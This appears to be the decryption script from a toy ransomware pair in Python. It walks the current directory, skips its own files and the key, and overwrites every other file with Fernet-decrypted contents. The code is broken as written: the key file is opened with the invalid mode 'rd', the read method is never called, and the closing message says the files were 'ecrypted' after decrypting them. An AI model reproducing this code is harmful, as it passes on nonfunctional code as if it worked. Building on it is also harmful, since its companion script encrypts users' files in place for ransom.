#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet	

#let's find some files

files = []

for file in os.listdir():
	if file == "thekey.key" or file == "encrypt.py" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rd") as thekey:
	key = thekey.read


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_decrypted = Fernet(key).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted) 


print("All of your files had been ecrypted!")